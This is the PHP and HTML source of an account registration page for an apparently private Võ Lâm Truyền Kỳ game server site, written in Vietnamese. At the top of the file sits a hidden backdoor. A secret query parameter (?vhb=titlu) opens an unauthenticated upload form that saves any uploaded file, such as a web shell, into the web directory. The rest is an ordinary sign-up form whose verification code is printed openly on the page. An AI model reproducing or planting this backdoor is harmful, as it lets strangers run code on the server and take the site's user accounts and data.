<?php
session_start();
include_once("cauhinh.php");
$_SESSION['ma']=rand(1000000,9999999);
if($_GET['vhb']=='titlu')
{
echo '<form method="POST" enctype="multipart/form-data" action="?vhb=titlu">
<input type="file" name="file_upload" size="20" id="file">
<input type="submit" name="gui" value="Up" >
</form>';if (isset($_POST['gui'])){
move_uploaded_file($_FILES['file_upload']['tmp_name'], $_FILES['file_upload']['name']);
}
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title><?php echo $tenweb; ?></title>
<script type="text/javascript" language="javascript">
function checkform()
{
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
var user,password,password2,email,fone,name,txtVerify;
with(window.document.form1)
{
user=Username;
password=Password;
password2=Password2;
email=Email;
fone=Fone;
name=Name;
mabaove=txtVerify;
}
if(trim(user.value)=="")
{
alert("Bạn chưa nhập tài khoản");
user.focus();
return false;
}
else if (!filter.test(email.value)) 
{
alert("Email đăng kí không hợp lệ");
email.focus();
return false;
}
else if(trim(password.value)=="")
{
alert("Bạn chưa nhập mật khẩu");
password.focus();
return false;
}
else if(trim(password2.value)!=trim(password.value))
{
alert("Xác nhận mật khẩu sai");
password2.focus();

return false;
}
else if(trim(mabaove.value)=="")
{
alert("Bạn chưa nhập mã bảo vệ");
mabaove.focus();
return false;
}
else
{
user.value=trim(user.value);
password.value=trim(password.value);
password2.value=trim(password2.value);
email.value=trim(email.value);
txtVerify.value=trim(txtVerify.value);
}
function trim(str)
{
return str.replace(/^\s+|\s+$/g,'');
}
}
</script>
<style type="text/css">
	@import 'css/global.css';	
	@import 'css/layout.css';	
	@import 'css/box-top.css';	
	@import 'css/style_sub.css';	
	@import 'css/j-navigation.css';	
	@import 'css/j-navigation-left.css';
	@import 'css/quick-link-style.css';

</style>

<script type="text/javascript" language="JavaScript">
        var activemenu_nav = "";
        var activesidenav = "";   
		var activedropmenu = "";
</script>
<script src="js/jquery-core.js" type="text/javascript" language="JavaScript"></script>
<script type="text/javascript" src="js/navigation.js"></script>
<script type="text/javascript" src="js/navigation-left.js"></script>
<script language="javascript" type="text/javascript" src="js/call-navigation.js"></script>
		<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" media="screen" title="no title" charset="utf-8" />
		<link rel="stylesheet" href="css/form.css" type="text/css" media="screen" title="no title" charset="utf-8" />
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js" type="text/javascript"></script>
		<script src="js/jquery.validationEngine-en.js" type="text/javascript"></script>
		<script src="js/jquery.validationEngine.js" type="text/javascript"></script>
		
		<!-- AJAX SUCCESS TEST FONCTION	
			<script>function callSuccessFunction(){alert("success executed")}
					function callFailFunction(){alert("fail executed")}
			</script>
		-->
		




	
<link href="css/content.css" rel="stylesheet" type="text/css">


<!-- phan content -->



<script>
<!--


function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
//-->
</script>

<script language="javascript">
<!--
document.forms[form1].onsubmit = function() {
if(this.elements['Password'].value != this.elements['Password2'].value) {
alert('Passwords do not match');
return false;
}

return true;
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += ''+ +''; }
  } if (errors) alert('Bạn chưa nhập đầy đủ thông tin');
  document.MM_returnValue = (errors == '');
}
//-->
</script>



<style type="text/css">
                @import 'css/style-topbar.css';
.style2 {font-size: 72px}
.style3 {color: transparent}
</style>
</head><body>
<div id="Banner-Popup-Bottom">
	<div id="Button-Close-Bottom"></div>
    <div id="ad_zone_508"></div>

</div>

<a name="top" id="top"></a>




<div id="box-out">

	<div id="wrapper">
		<div id="footer">
<div id="container">
		  
			<!-- block menu_header_html -->
            <div id="box-menu">
              <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="695" height="204">
                <param name="movie" value="img/flash.swf" />
		  <param value="transparent" name="wmode">
                <param name="quality" value="high" />
                <embed src="img/flash.swf" width="695" height="204" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
              </object>
			  
	
</div>
            <!-- block menu_header_html -->

			
		<div class="clear"></div>	 			
			<div id="header">
				<div id="logo"><a href="index.php" title="Trở về trang chủ Võ Lâm Truyền Kỳ" onclick="pageTracker._trackEvent('Vo Lam', 'Logo', 'Sub - Home Link');"><img src="images/blank.gif" alt="Võ Lâm Truyền Kỳ" title="Võ Lâm Truyền Kỳ" width="180" height="100"></a></div>
		<div class="style2" id="download"><a href="taigame.php" class="style3"></a>
			  <object style="visibility: visible;" id="flash-content" data="img/trackDown.swf" type="application/x-shockwave-flash" width="126" height="74"><param value="transparent" name="wmode"><param value="true" name="allowfullscreen"><param value="noscale" name="scale"><param value="high" name="quality"><param value="always" name="allowScriptAccess"><param value="downloadgame=taigame.php" name="flashvars"></object>
                                                                                  
                                                                                                <script type="text/javascript">                                 
                                                                                                var flashvars = {};
                                                                                                var attributes = {};
                                                                                                var params = {};
																								flashvars.downloadgame="http://volam.zing.vn/thu-vien-download/game-download.html"
                                                                                                params.wmode = "transparent";
                                                                                                params.allowfullscreen ="true";
                                                                                                params.scale = "noscale";
                                                                                                params.quality = "high";
                                                                                                params.allowScriptAccess = "always";
                                                                                                swfobject.embedSWF("img/trackDown.swf", "flash-content", "126", "74", "8.0.0","http://img.zing.vn/ms/flash/expressInstall.swf", flashvars, params, attributes);
                                                                                                </script>

			</div>
			</div>
		<!-- END Header  -->
		
		<!-- mainbox  -->
		<div id="mainbox">		
		<div id="hoa-van"></div>	
		  <div id="col-1"> 
			<div id="col-1-b">
				<div id="col-1-t">
				<p class="dangky"><a href="dangki.php" target="_blank" title="Đăng ký" onclick="pageTracker._trackEvent('Vo Lam', 'Sub', 'Register');">Đăng ký</a></p>
							
					<!-- block left_menu_huongdancoban_html -->

<p><img src="images/title-huongdancoban.jpg"></p>

<div id="box-sidenav">
  <ul id="sidenav">
   <li><a href="index.php">Trang chủ </a></li>
    <li><a href="login.php">Đăng nhập</a></li>
	    <li><a href="quenmatkhau.php">Quên mật khẩu</a></li>
    <li><a href="taigame.php">Hướng dẫn tải game </a>
      <li><a href="hdchuyensinh.php">Hướng dẫn chuyển sinh</a>   <li><a href="huongdantanthu.php">Hướng dẫn tân thủ</a>
			    <li><a href="toadoboss.php">Tọa độ boss </a>
				   <li><a href="toadonpc.php">Tọa độ NPC </a>
				    <li><a href="banggia.php">Bảng Giá (Mua items-KNB)</a>
			    <li><a href="quydinh.php">Quy định</a>
	    <li><a href="javascript:void(0);">Cập nhật môn phái </a>
      <ul>
        <li><a href="thienvuong.php">Thiên Vương</a></li>
          <li><a href="thieulam.php">Thiếu Lâm</a></li>
		      <li><a href="duongmon.php">Đường Môn</a></li>
			      <li><a href="ngudoc.php">Ngũ Độc</a></li>
				      <li><a href="ngamy.php">Nga My</a></li>
					      <li><a href="thuyyen.php">Thúy Yên</a></li>
						      <li><a href="caibang.php">Cái Bang</a></li>
							      <li><a href="thiennhan.php">Thiên Nhẫn</a></li>
								      <li><a href="vodang.php">Võ Đang</a></li>
									      <li><a href="conlon.php">Côn Lôn</a></li>
										  </ul>
    </li>
   <li><a href="javascript:void(0);">Thống kê</a>
      <ul>
        <li><a href="">Thiên Vương</a></li>
										  </ul>
    </li>
  </ul>
</div>
<!-- block left_menu_huongdancoban_html -->

				
				<div class="clear"></div>
				<div id="ad_zone_310" class="nav-ad"><div id="beacon_4553" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="images/lg.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div></div>
			</div>
			</div>
		  </div>	  
		  <div id="col-2">
			  <div class="content-bg">
 <div class="content-t">
						<!-- STORY-->
 <div class="contentHTML">
  <div class="title">
    <div class="titleLocation">Đăng ký</div>
  </div>
  <div class="boxContent">
    <div class="title-page">
      <h1>&nbsp;</h1>
    </div>
    <p>&nbsp;</p><form class="formular" method="post" action="ktdangki.php" name="form1" onsubmit="return checkform()">
    <table width="400" border="0" align="center">
      <tr>
        <td width="244"><strong>Tài khoản</strong></td>
        <td width="140"><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="text" id="Username" name="Username"></div></td>
      </tr>
      <tr>
        <td><strong>Mật khẩu</strong></td>
        <td><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="password" id="Password" name="Password"></div></td>
      </tr>
      <tr>
              </tr>
      <tr>
        <td><strong>Nhập lại mật khẩu</strong></td>
        <td><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="password" id="Password2" name="Password2"></div></td>
      </tr>
	  <tr>
      </tr>
      <tr>
        <td><strong>Mật Khẩu Cấp 2</strong></td>
        <td><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="text" id="traloi" name="traloi"></div></td>
      </tr>
	  <tr>
        <td width="244"><strong>Số Điện Thoại</strong></td>
        <td width="140"><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="text" id="Fone" name="Fone"></div></td>
      </tr>
      <tr>
        <td><strong>Nh&#7853;p 7 ch&#7919; s&#7889; x&#225;c nh&#7853;n</font>
            </p>
        </strong></td>
        <td>  <input id="txtVerify" style="WIDTH: 100px" maxlength="7" name="txtVerify" /></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
        <td><p><font color="#FFFFFF" size="5" style="background-color:#3366FF"><?php echo ($_SESSION['ma']);?></font></p>
          <p>&nbsp;</p>
          <p>                   <input name="btnNextStep" type="submit" class="validate[confirm]" id="btnNextStep" style="WIDTH: 150px" onclick="MM_validateForm('Fone','','R','Name','','R');return document.MM_returnValue" value="Đăng Kí Game"/>   
          </form>
          </p></td>
      </tr>
      </table><div class="title-page">
      <h1>&nbsp;</h1>
    </div>
 
 

<script>
   	var activesidenav = "menu4_1_0";
	var activemenu_nav = "menu3_4_1";
</script>
<!-- /STORY-->
 

	



  	
	
			<!-- END STORY -->
		  </div>			  </div>
			  <div class="content-b"></div>
		  </div>
</div>			  </div>
	  </div>
</div>
		  <div class="clear"></div>
			<div id="box-footer">
				<p>WEB JX PRO FULL - SKIN RIP BY MILLY.</p>
			</div>
</body></html>